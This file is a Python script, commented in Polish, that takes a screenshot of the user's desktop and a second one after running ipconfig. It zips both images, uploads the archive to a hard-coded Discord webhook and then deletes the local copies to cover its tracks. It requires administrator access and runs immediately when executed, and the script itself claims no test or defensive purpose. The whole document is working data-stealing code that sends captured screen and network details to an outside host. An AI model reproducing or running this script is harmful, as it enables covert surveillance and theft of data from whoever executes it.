import os
import zipfile
import requests
import sys
import pyautogui
import subprocess

# URL webhooków
webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"

# Ścieżka do katalogu z użytkownikami
users_directory = r"C:\Users"

# Funkcja do sprawdzania uprawnień
if not os.access(users_directory, os.W_OK):
    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
    sys.exit(1)

# Funkcja do wysyłania pliku na Discord
def send_file_to_discord(file_path, webhook_url):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                webhook_url,
                files={"file": file},
                data={"content": f"Plik wysłany z {file_path}!"}
            )
        if response.status_code == 200:
            print(f"Plik {file_path} wysłany na Discord.")
        else:
            print(f"Błąd przy wysyłaniu {file_path}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Błąd przy otwieraniu pliku {file_path}: {e}")

# Funkcja do robienia zrzutu ekranu
def take_screenshot(save_path):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(save_path)
        print(f"Zrzut ekranu zapisany w {save_path}")
        return save_path
    except Exception as e:
        print(f"Błąd przy robieniu zrzutu ekranu: {e}")
        return None

# Funkcja do tworzenia pliku ZIP
def create_zip_from_files(file_paths, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in file_paths:
            zipf.write(file, os.path.basename(file))
    print(f"Pliki spakowane do {zip_file_name}")

# Funkcja do robienia zrzutu ekranu z polecenia `ipconfig`
def take_ipconfig_screenshot():
    try:
        subprocess.run("ipconfig", shell=True, check=True)
        screenshot_path_ipconfig = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'ipconfig_screenshot.png')
        screenshot_ipconfig = pyautogui.screenshot()
        screenshot_ipconfig.save(screenshot_path_ipconfig)
        print(f"Zrzut ekranu ipconfig zapisany w {screenshot_path_ipconfig}")
        return screenshot_path_ipconfig
    except Exception as e:
        print(f"Błąd przy robieniu zrzutu ekranu ipconfig: {e}")
        return None

# Funkcja główna
def create_zip_with_screenshots():
    files_to_zip = []

    # Zrzut ekranu pulpitu
    screenshot_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'screenshot.png')
    screenshot_file = take_screenshot(screenshot_path)
    if screenshot_file:
        files_to_zip.append(screenshot_file)

    # Zrzut ekranu ipconfig
    ipconfig_screenshot_file = take_ipconfig_screenshot()
    if ipconfig_screenshot_file:
        files_to_zip.append(ipconfig_screenshot_file)

    # Tworzenie ZIP-a
    zip_file_name = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Complete_Screenshot_Archive.zip')
    create_zip_from_files(files_to_zip, zip_file_name)

    # Wysyłanie ZIP-a na Discord
    send_file_to_discord(zip_file_name, webhook_url_1)

    # Usuwanie plików tymczasowych
    try:
        os.remove(zip_file_name)
        print(f"Plik {zip_file_name} został usunięty po wysłaniu.")
        for file in files_to_zip:
            if os.path.exists(file):
                os.remove(file)
                print(f"Plik tymczasowy {file} został usunięty.")
    except Exception as e:
        print(f"Błąd przy usuwaniu plików: {e}")

# Uruchomienie funkcji
create_zip_with_screenshots()
